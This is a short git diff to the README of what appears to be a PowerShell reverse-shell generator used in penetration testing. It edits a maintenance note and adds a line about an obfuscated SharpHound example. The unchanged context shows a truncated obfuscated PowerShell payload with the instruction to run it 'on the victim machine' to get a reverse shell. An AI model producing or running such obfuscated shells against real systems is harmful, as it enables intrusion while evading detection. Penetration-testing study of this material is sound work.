@@ -6,7 +6,7 @@
 - Use TLS and command obfuscation
 - Keep It Simple, Stupid
 
-This tool is presented for educational purpose. i do NOT maintain it.
+This tool is presented for educational purpose. i do not maintain it anymore.
 It was used in real security tests and in advenced penetration testing labs (2020-2022).
 
 ## Disclaimer
@@ -117,3 +117,7 @@ output:
 $186=255;$208=[SYStEM.TexT.ENCoDiNg];$102=$208::Utf8.gETByTeS('');$208::AsCii.GetString($(([bytE]55,86,80,97...
 ```
 Execute the output on the victim machine to get your reverse shell
+
+## Misc
+
+this project contains also an exemple of how obfuscate Sharphound (BloodHound ingestor)
